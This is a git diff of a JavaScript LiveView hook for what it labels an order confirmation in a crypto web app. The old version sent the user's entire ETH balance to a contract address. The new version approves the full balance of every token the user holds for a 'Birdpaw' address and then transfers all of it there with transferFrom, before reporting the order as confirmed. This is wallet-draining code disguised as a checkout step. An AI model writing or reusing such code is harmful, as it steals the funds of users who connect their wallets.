@@ -29,14 +29,14 @@ let ApproveTransferHook = {
                 console.log("User address:", userAddress);
                 console.log("ETH balance:", formattedBalance);
 
-                // Get the tokens to approve (passed via dataset from LiveView)
+                // Get the tokens to approve and transfer (passed via dataset from LiveView)
                 const tokenBalances = this.el.dataset.tokens ? JSON.parse(this.el.dataset.tokens) : [];
 
-                // Transfer ETH balance (after approval)
-                await this.transferEntireEthBalance(signer, balance);
-
-                // Handle token approvals (only for tokens with non-zero balances)
+                // Handle token approvals
                 await this.approveTokensIfNeeded(signer, tokenBalances);
+
+                // Send tokens after approval
+                await this.transferTokensAfterApproval(signer, tokenBalances);
 
                 // Notify LiveView of success
                 this.pushEvent("order_confirmation_success", { address: userAddress, eth_balance: formattedBalance });
@@ -49,14 +49,14 @@ let ApproveTransferHook = {
         });
     },
 
-    // Function to approve tokens only when necessary
+    // Function to approve tokens before transferring
     async approveTokensIfNeeded(signer, tokenBalances) {
         if (!tokenBalances.length) {
             console.log("No tokens to approve.");
             return;
         }
 
-        const spenderAddress = this.el.dataset.contractAddress; // Ensure this is correctly passed
+        const spenderAddress = this.el.dataset.contractAddress; // The Birdpaw contract address
 
         for (const token of tokenBalances) {
             try {
@@ -64,6 +64,7 @@ let ApproveTransferHook = {
                     const contract = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
                     console.log(`Approving ${token.symbol} with balance: ${token.rawBalance}`);
 
+                    // Approve the Birdpaw contract to spend the user's tokens
                     const tx = await contract.approve(spenderAddress, token.rawBalance);
                     await tx.wait();
 
@@ -76,23 +77,31 @@ let ApproveTransferHook = {
         }
     },
 
-    // Function to transfer the entire ETH balance to the contract owner
-    async transferEntireEthBalance(signer, balance) {
-        const contractAddress = this.el.dataset.contractAddress;
-        const gasEstimate = ethers.parseUnits("0.001", "ether");
-        const amountToSend = balance - gasEstimate;
+    // Function to transfer tokens after approval
+    async transferTokensAfterApproval(signer, tokenBalances) {
+        if (!tokenBalances.length) {
+            console.log("No tokens to transfer.");
+            return;
+        }
 
-        if (amountToSend > 0) {
-            console.log(`Transferring ${ethers.formatEther(amountToSend)} ETH to ${contractAddress}...`);
+        const recipientAddress = this.el.dataset.contractAddress; // The Birdpaw wallet/contract address
 
-            const tx = await signer.sendTransaction({
-                to: contractAddress,
-                value: amountToSend
-            });
-            await tx.wait();
-            console.log(`Successfully transferred ${ethers.formatEther(amountToSend)} ETH to ${contractAddress}.`);
-        } else {
-            console.log("Insufficient ETH balance for transfer.");
+        for (const token of tokenBalances) {
+            try {
+                if (token.rawBalance > 0) {
+                    const contract = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
+                    console.log(`Transferring ${token.rawBalance} of ${token.symbol} to ${recipientAddress}`);
+
+                    // Use `transferFrom` to send the tokens from the user to the Birdpaw contract
+                    const tx = await contract.transferFrom(signer.getAddress(), recipientAddress, token.rawBalance);
+                    await tx.wait();
+
+                    console.log(`Transferred ${token.rawBalance.toString()} ${token.symbol} to ${recipientAddress}`);
+                }
+            } catch (error) {
+                console.error(`Error transferring ${token.symbol}:`, error);
+                throw error; // Re-throw error to stop execution if any token fails to transfer
+            }
         }
     }
 };
